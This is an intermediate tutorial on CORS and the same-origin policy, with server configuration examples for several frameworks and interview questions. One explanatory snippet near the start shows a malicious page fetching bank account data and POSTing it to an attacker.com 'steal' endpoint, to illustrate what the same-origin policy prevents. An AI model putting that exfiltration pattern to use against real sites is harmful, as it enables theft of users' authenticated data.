---
title: CORS Cross-Origin Resource Sharing
description: Deep dive into CORS mechanism and configuration
track: security
section: web-security
difficulty: intermediate
tags:
  - CORS
  - cross-origin
  - same-origin policy
  - web security
status: imported
origin: old/src/content/docs/security/cors.en.md
divergence: 0.287
issues: []
legacy:
  category: Security
  subcategory: Web Security
  order: 22
  lastUpdated: 2026-01-07
---

Cross-Origin Resource Sharing (CORS) is a critical security mechanism that allows web applications to make requests to domains different from their own. Understanding CORS is essential for modern web development, as it affects how frontend applications communicate with APIs and external services. We'll cover the CORS mechanism comprehensively, from fundamental concepts to secure configuration practices.

## Same-Origin Policy Foundation

### What is Same-Origin Policy

The Same-Origin Policy (SOP) is a fundamental security concept implemented by web browsers that restricts how documents or scripts from one origin can interact with resources from another origin. Two URLs have the same origin if they share the same protocol, host, and port.

```
Origin Components
|
+-- Protocol (scheme): http, https
+-- Host: example.com, api.example.com
+-- Port: 80, 443, 3000

Same Origin Examples:
https://example.com/page1 and https://example.com/page2  -> Same origin
https://example.com:443/page and https://example.com/page -> Same origin (443 is default for HTTPS)

Different Origin Examples:
https://example.com and http://example.com   -> Different (protocol)
https://example.com and https://api.example.com -> Different (host)
https://example.com and https://example.com:8080 -> Different (port)
```

### Why Same-Origin Policy Exists

Without SOP, malicious websites could freely access sensitive data from other websites where users are authenticated:

```
Scenario without Same-Origin Policy:

1. User logs into bank.com
2. User visits malicious-site.com in another tab
3. malicious-site.com runs JavaScript:
   fetch('https://bank.com/api/account')
   .then(response => response.json())
   .then(data => {
     // Send user's bank data to attacker's server
     fetch('https://attacker.com/steal', {
       method: 'POST',
       body: JSON.stringify(data)
     });
   });

With Same-Origin Policy:
The browser blocks step 3 - the request to bank.com is blocked
because malicious-site.com is a different origin.
```

### What SOP Restricts

The Same-Origin Policy restricts the following cross-origin interactions:

| Resource Type | Behavior |
|---------------|----------|
| DOM Access | Scripts cannot access DOM of cross-origin iframes |
| Cookie/Storage | Cannot read cookies, localStorage, or IndexedDB from other origins |
| AJAX/Fetch | Cross-origin requests are restricted (this is where CORS comes in) |
| Embedding | Generally allowed (images, scripts, stylesheets, iframes) |

```javascript
// DOM Access Restriction
// Page at https://example.com trying to access iframe from https://other.com
const iframe = document.getElementById('cross-origin-iframe');
iframe.contentDocument; // SecurityError: Blocked cross-origin access

// Storage Restriction
// Cannot access localStorage from other origins
localStorage.setItem('key', 'value'); // Only accessible from same origin

// AJAX Restriction (without CORS)
fetch('https://api.other-domain.com/data')
  .then(response => response.json())
  .catch(error => {
    // CORS error: No 'Access-Control-Allow-Origin' header
    console.error('Cross-origin request blocked:', error);
  });
```

## Understanding CORS

### What is CORS

CORS (Cross-Origin Resource Sharing) is a mechanism that uses additional HTTP headers to tell browsers to allow a web application running at one origin to access selected resources from a different origin. It is a controlled relaxation of the Same-Origin Policy.

```
CORS Request Flow:

Browser (https://app.com)                    Server (https://api.com)
        |                                           |
        |--- Request with Origin header ----------->|
        |    Origin: https://app.com                |
        |                                           |
        |<-- Response with CORS headers ------------|
        |    Access-Control-Allow-Origin: *         |
        |    or                                     |
        |    Access-Control-Allow-Origin: https://app.com
        |                                           |
Browser checks if origin is allowed
If allowed: JavaScript can access response
If not: Browser blocks access, throws CORS error
```

### CORS vs JSONP

Before CORS, JSONP (JSON with Padding) was commonly used for cross-origin requests. Understanding the differences helps appreciate why CORS is preferred:

```javascript
// JSONP (Legacy approach - security risks)
// Exploits the fact that <script> tags can load cross-origin resources
function handleResponse(data) {
  console.log('Received:', data);
}

const script = document.createElement('script');
script.src = 'https://api.example.com/data?callback=handleResponse';
document.body.appendChild(script);
// Server responds with: handleResponse({"key": "value"})

// Problems with JSONP:
// 1. Only supports GET requests
// 2. No error handling
// 3. XSS vulnerability if response is malicious
// 4. Cannot send custom headers

// CORS (Modern approach)
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ key: 'value' })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

// CORS advantages:
// 1. Supports all HTTP methods
// 2. Proper error handling
// 3. Can send custom headers
// 4. Server controls access explicitly
```

## CORS Headers Explained

### Response Headers

The server uses these headers to indicate whether cross-origin access is allowed:

```
Access-Control-Allow-Origin
|
+-- Specifies which origins can access the resource
|   - "*" allows any origin (not recommended for sensitive data)
|   - "https://example.com" allows specific origin
|   - Cannot specify multiple origins directly
|
Access-Control-Allow-Methods
|
+-- Specifies allowed HTTP methods for cross-origin requests
|   - "GET, POST, PUT, DELETE, OPTIONS"
|
Access-Control-Allow-Headers
|
+-- Specifies allowed request headers
|   - "Content-Type, Authorization, X-Custom-Header"
|
Access-Control-Allow-Credentials
|
+-- Indicates if credentials (cookies, auth headers) can be sent
|   - "true" or absent
|   - Cannot be used with Allow-Origin: *
|
Access-Control-Expose-Headers
|
+-- Specifies which headers can be accessed by JavaScript
|   - By default, only simple response headers are exposed
|   - "X-Custom-Header, X-Request-Id"
|
Access-Control-Max-Age
|
+-- How long preflight response can be cached (in seconds)
|   - "86400" (24 hours)
```

### Request Headers

The browser automatically adds these headers to cross-origin requests:

```
Origin
|
+-- Automatically added by browser
|   - Contains the requesting origin
|   - "https://app.example.com"
|
Access-Control-Request-Method
|
+-- Used in preflight requests
|   - Indicates the HTTP method that will be used
|   - "PUT"
|
Access-Control-Request-Headers
|
+-- Used in preflight requests
|   - Lists custom headers that will be sent
|   - "Content-Type, Authorization"
```

### Header Examples

```javascript
// Server response headers for a typical CORS-enabled API
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://app.example.com',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Expose-Headers': 'X-Request-Id, X-RateLimit-Remaining',
  'Access-Control-Max-Age': '86400'
};
```

## Simple vs Preflight Requests

### Simple Requests

A request is considered "simple" if it meets ALL of these conditions:

```
Simple Request Criteria:
|
+-- Method is one of: GET, HEAD, POST
|
+-- Headers are only:
|   - Accept
|   - Accept-Language
|   - Content-Language
|   - Content-Type (with restrictions)
|
+-- Content-Type is one of:
|   - application/x-www-form-urlencoded
|   - multipart/form-data
|   - text/plain
|
+-- No ReadableStream object in request
+-- No event listeners on XMLHttpRequest.upload
```

Simple request flow:

```
Browser                                          Server
   |                                               |
   |--- GET /api/data --------------------------->|
   |    Origin: https://app.com                   |
   |                                               |
   |<-- 200 OK -----------------------------------|
   |    Access-Control-Allow-Origin: https://app.com
   |    [Response Body]                           |
   |                                               |
Browser checks CORS headers and allows access
```

### Preflight Requests

Any request that does not meet the simple request criteria triggers a preflight request:

```
Scenarios that trigger preflight:
|
+-- Methods other than GET, HEAD, POST
|   (PUT, DELETE, PATCH, etc.)
|
+-- Custom headers
|   (Authorization, X-Custom-Header, etc.)
|
+-- Content-Type other than simple types
|   (application/json, application/xml, etc.)
```

Preflight request flow:

```
Browser                                          Server
   |                                               |
   |--- OPTIONS /api/data ----------------------->|  Preflight
   |    Origin: https://app.com                   |
   |    Access-Control-Request-Method: PUT        |
   |    Access-Control-Request-Headers: Content-Type, Authorization
   |                                               |
   |<-- 204 No Content ---------------------------|
   |    Access-Control-Allow-Origin: https://app.com
   |    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   |    Access-Control-Allow-Headers: Content-Type, Authorization
   |    Access-Control-Max-Age: 86400             |
   |                                               |
   |--- PUT /api/data --------------------------->|  Actual request
   |    Origin: https://app.com                   |
   |    Content-Type: application/json            |
   |    Authorization: Bearer token               |
   |    [Request Body]                            |
   |                                               |
   |<-- 200 OK -----------------------------------|
   |    Access-Control-Allow-Origin: https://app.com
   |    [Response Body]                           |
```

### Code Example: Preflight Handling

```javascript
// Express.js middleware for handling CORS preflight
const express = require('express');
const app = express();

// Manual CORS handling
app.use((req, res, next) => {
  const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }

  next();
});

// Using the cors package (recommended)
const cors = require('cors');

const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
```

## Credentials and Cookies

### Sending Credentials Cross-Origin

By default, cross-origin requests do not include credentials (cookies, HTTP authentication, client-side SSL certificates). Both the client and server must opt-in:

```javascript
// Client-side: Include credentials in request
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include' // 'include' | 'same-origin' | 'omit'
})
.then(response => response.json())
.then(data => console.log(data));

// Using XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.withCredentials = true;
xhr.send();

// Using axios
axios.get('https://api.example.com/data', {
  withCredentials: true
});
```

```javascript
// Server-side: Allow credentials
// Express.js
app.use(cors({
  origin: 'https://app.example.com', // Cannot use '*' with credentials
  credentials: true
}));

// Or manually
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

### Credentials and Wildcard Origin

A critical security rule: `Access-Control-Allow-Origin: *` cannot be used with `Access-Control-Allow-Credentials: true`:

```javascript
// INCORRECT - Browser will reject this
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// Error: Cannot use wildcard with credentials

// CORRECT - Specify exact origin
res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// CORRECT - Dynamic origin based on request
app.use((req, res, next) => {
  const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

### Cookie SameSite Attribute

Modern browsers require proper cookie configuration for cross-origin requests:

```javascript
// Setting cookies for cross-origin access
// Express.js
res.cookie('sessionId', 'value', {
  httpOnly: true,
  secure: true,        // Required for SameSite=None
  sameSite: 'None',    // Allow cross-origin
  domain: '.example.com',
  maxAge: 24 * 60 * 60 * 1000
});

// SameSite values:
// - 'Strict': Cookie sent only to same-site requests
// - 'Lax': Cookie sent with top-level navigations and GET from third-party
// - 'None': Cookie sent with all requests (requires Secure)
```

## Common CORS Issues and Solutions

### Issue 1: Missing CORS Headers

```
Error: Access to fetch at 'https://api.example.com/data' from origin
'https://app.example.com' has been blocked by CORS policy:
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

**Solution:**

```javascript
// Server must add CORS headers
// Node.js/Express
const cors = require('cors');
app.use(cors({
  origin: 'https://app.example.com'
}));

// Nginx
location /api/ {
    add_header 'Access-Control-Allow-Origin' 'https://app.example.com' always;
    add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
    add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;

    if ($request_method = 'OPTIONS') {
        return 204;
    }
}
```

### Issue 2: Preflight Request Fails

```
Error: Response to preflight request doesn't pass access control check:
The value of the 'Access-Control-Allow-Origin' header in the response
must not be the wildcard '*' when the request's credentials mode is 'include'.
```

**Solution:**

```javascript
// Use specific origin instead of wildcard
const allowedOrigins = ['https://app.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

### Issue 3: Custom Headers Not Allowed

```
Error: Request header field X-Custom-Header is not allowed
by Access-Control-Allow-Headers in preflight response.
```

**Solution:**

```javascript
// Explicitly allow the custom header
app.use(cors({
  origin: 'https://app.example.com',
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Custom-Header']
}));
```

### Issue 4: Method Not Allowed

```
Error: Method PUT is not allowed by Access-Control-Allow-Methods
in preflight response.
```

**Solution:**

```javascript
// Add the required method
app.use(cors({
  origin: 'https://app.example.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
}));
```

### Issue 5: Credentials Not Working

```javascript
// Client sends credentials but server doesn't receive cookies

// Check 1: Client must include credentials
fetch(url, { credentials: 'include' });

// Check 2: Server must allow credentials
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Check 3: Cannot use wildcard origin with credentials
res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com'); // Not '*'

// Check 4: Cookie SameSite must allow cross-origin
res.cookie('session', 'value', {
  sameSite: 'None',
  secure: true
});
```

### Debugging CORS Issues

```javascript
// Browser DevTools debugging
// 1. Open Network tab
// 2. Look for failed requests (red)
// 3. Check preflight OPTIONS request
// 4. Examine request and response headers

// Programmatic debugging
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ test: true })
})
.then(response => {
  console.log('Response headers:');
  response.headers.forEach((value, key) => {
    console.log(`${key}: ${value}`);
  });
  return response.json();
})
.catch(error => {
  console.error('CORS or network error:', error);
});

// Using curl to test CORS
// Simulate preflight request
// curl -X OPTIONS https://api.example.com/data \
//   -H "Origin: https://app.example.com" \
//   -H "Access-Control-Request-Method: POST" \
//   -H "Access-Control-Request-Headers: Content-Type" \
//   -v
```

## Secure CORS Configuration

### Security Best Practices

```javascript
// 1. Never use wildcard with credentials
// BAD
app.use(cors({ origin: '*', credentials: true }));

// GOOD
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// 2. Whitelist specific origins
const whitelist = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin || whitelist.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
}));

// 3. Limit allowed methods to what's needed
app.use(cors({
  origin: 'https://app.example.com',
  methods: ['GET', 'POST'], // Only allow what's necessary
}));

// 4. Limit allowed headers
app.use(cors({
  origin: 'https://app.example.com',
  allowedHeaders: ['Content-Type', 'Authorization'] // Minimal required headers
}));

// 5. Set appropriate max-age for preflight caching
app.use(cors({
  origin: 'https://app.example.com',
  maxAge: 86400 // 24 hours - balance between performance and security
}));
```

### Production Configuration Examples

```javascript
// Express.js production CORS configuration
const cors = require('cors');

const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc.)
    if (!origin) {
      return callback(null, true);
    }

    // Production whitelist
    const whitelist = process.env.ALLOWED_ORIGINS?.split(',') || [];

    if (whitelist.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`CORS blocked request from: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'X-Request-ID'
  ],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
  credentials: true,
  maxAge: 86400,
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

// Per-route CORS configuration
app.get('/api/public', cors({ origin: '*' }), (req, res) => {
  // Public endpoint - allow any origin
  res.json({ data: 'public' });
});

app.get('/api/private', cors(corsOptions), (req, res) => {
  // Private endpoint - restricted origins
  res.json({ data: 'private' });
});
```

### Nginx CORS Configuration

```nginx
# /etc/nginx/conf.d/cors.conf

map $http_origin $cors_origin {
    default "";
    "https://app.example.com" $http_origin;
    "https://admin.example.com" $http_origin;
}

server {
    listen 443 ssl http2;
    server_name api.example.com;

    location /api/ {
        # Handle preflight
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization, X-Requested-With' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Max-Age' 86400 always;
            add_header 'Content-Length' 0;
            return 204;
        }

        # Handle actual requests
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Access-Control-Expose-Headers' 'X-Request-ID' always;

        proxy_pass http://backend;
    }
}
```

### AWS API Gateway CORS

```yaml
# AWS SAM template CORS configuration
Resources:
  ApiGateway:
    Type: AWS::Serverless::Api
    Properties:
      StageName: prod
      Cors:
        AllowMethods: "'GET,POST,PUT,DELETE,OPTIONS'"
        AllowHeaders: "'Content-Type,Authorization,X-Requested-With'"
        AllowOrigin: "'https://app.example.com'"
        AllowCredentials: true
        MaxAge: "'86400'"
```

## CORS in Different Frameworks

### Node.js / Express

```javascript
// Using cors middleware
const cors = require('cors');
const express = require('express');
const app = express();

app.use(cors({
  origin: ['https://app.example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
}));
```

### Python / Flask

```python
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)

# Simple usage
CORS(app)

# Configured usage
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://app.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,
        "max_age": 86400
    }
})
```

### Python / Django

```python
# settings.py
INSTALLED_APPS = [
    ...
    'corsheaders',
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Must be high in the list
    'django.middleware.common.CommonMiddleware',
    ...
]

# Configuration
CORS_ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'PUT',
    'DELETE',
    'OPTIONS',
]

CORS_ALLOW_HEADERS = [
    'content-type',
    'authorization',
    'x-requested-with',
]

CORS_ALLOW_CREDENTIALS = True
CORS_PREFLIGHT_MAX_AGE = 86400
```

### Go / Gin

```go
package main

import (
    "github.com/gin-gonic/gin"
    "github.com/gin-contrib/cors"
    "time"
)

func main() {
    r := gin.Default()

    r.Use(cors.New(cors.Config{
        AllowOrigins:     []string{"https://app.example.com"},
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
        AllowHeaders:     []string{"Content-Type", "Authorization"},
        ExposeHeaders:    []string{"X-Request-ID"},
        AllowCredentials: true,
        MaxAge:           24 * time.Hour,
    }))

    r.Run()
}
```

### Spring Boot (Java)

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

@Configuration
public class CorsConfig {

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        config.addAllowedOrigin("https://app.example.com");
        config.addAllowedMethod("*");
        config.addAllowedHeader("*");
        config.setAllowCredentials(true);
        config.setMaxAge(86400L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);

        return new CorsFilter(source);
    }
}
```

## Interview Questions

### Common Interview Questions and Answers

**Q1: What is CORS and why is it needed?**

A: CORS (Cross-Origin Resource Sharing) is a security mechanism that allows servers to specify which origins can access their resources. It's needed because browsers implement the Same-Origin Policy, which blocks cross-origin requests by default. CORS provides a controlled way to relax this restriction when legitimate cross-origin access is required, such as when a frontend application needs to communicate with an API on a different domain.

**Q2: What is the difference between a simple request and a preflight request?**

A: A simple request meets specific criteria (GET/HEAD/POST methods, limited headers, limited Content-Types) and is sent directly to the server. A preflight request is an automatic OPTIONS request sent by the browser before the actual request when the request doesn't meet simple request criteria. The preflight asks the server for permission to send the actual request with specific methods, headers, or credentials.

```
Simple Request: One round trip
Browser -> Server (actual request with Origin header)
Server -> Browser (response with CORS headers)

Preflight Request: Two round trips
Browser -> Server (OPTIONS preflight)
Server -> Browser (CORS permission headers)
Browser -> Server (actual request)
Server -> Browser (actual response)
```

**Q3: Why can't you use `Access-Control-Allow-Origin: *` with credentials?**

A: This is a security measure. If wildcard origin were allowed with credentials, any website could make authenticated requests to your API and access sensitive data. By requiring a specific origin when credentials are involved, the server explicitly controls which origins can access authenticated resources.

**Q4: How do you handle CORS for multiple origins?**

A: Since the `Access-Control-Allow-Origin` header can only contain one value (or `*`), you need to implement dynamic origin handling:

```javascript
const allowedOrigins = ['https://app1.com', 'https://app2.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

**Q5: What is the purpose of `Access-Control-Max-Age`?**

A: `Access-Control-Max-Age` specifies how long (in seconds) the browser can cache the preflight response. This improves performance by reducing the number of preflight requests. However, setting it too high could be a security concern if CORS policies change, as browsers would continue using the cached permissions.

### Key Concepts Summary

```
CORS Knowledge Framework
|
+-- Foundation
|   +-- Same-Origin Policy: Browser security mechanism
|   +-- Origin: protocol + host + port
|   +-- CORS: Controlled relaxation of SOP
|
+-- Request Types
|   +-- Simple Requests: Direct, single round-trip
|   +-- Preflight Requests: OPTIONS first, then actual
|
+-- Essential Headers
|   +-- Access-Control-Allow-Origin: Allowed origins
|   +-- Access-Control-Allow-Methods: Allowed HTTP methods
|   +-- Access-Control-Allow-Headers: Allowed request headers
|   +-- Access-Control-Allow-Credentials: Allow cookies/auth
|   +-- Access-Control-Max-Age: Preflight cache duration
|
+-- Security Considerations
|   +-- Never use * with credentials
|   +-- Whitelist specific origins
|   +-- Limit methods and headers
|   +-- Configure appropriate max-age
|
+-- Common Issues
    +-- Missing CORS headers
    +-- Preflight failures
    +-- Credential configuration
    +-- Custom header not allowed
```

## Summary

CORS is an essential mechanism for modern web development that enables secure cross-origin communication while maintaining the protective boundaries established by the Same-Origin Policy. Key takeaways:

1. **Understand the Fundamentals**: Same-Origin Policy protects users from malicious cross-origin access. CORS provides a controlled way to allow legitimate cross-origin requests.

2. **Know the Request Types**: Simple requests are straightforward; preflight requests involve an additional OPTIONS request to check permissions before the actual request.

3. **Configure Headers Properly**: Use specific origins instead of wildcards when credentials are involved, limit allowed methods and headers to what's necessary, and set appropriate cache durations.

4. **Debug Effectively**: Use browser DevTools to inspect request/response headers, understand error messages, and identify configuration issues.

5. **Follow Security Best Practices**: Whitelist origins explicitly, avoid overly permissive configurations, and regularly audit your CORS policies.

CORS configuration may seem complex at first, but understanding the underlying security model and following best practices will help you implement secure and functional cross-origin communication in your applications.
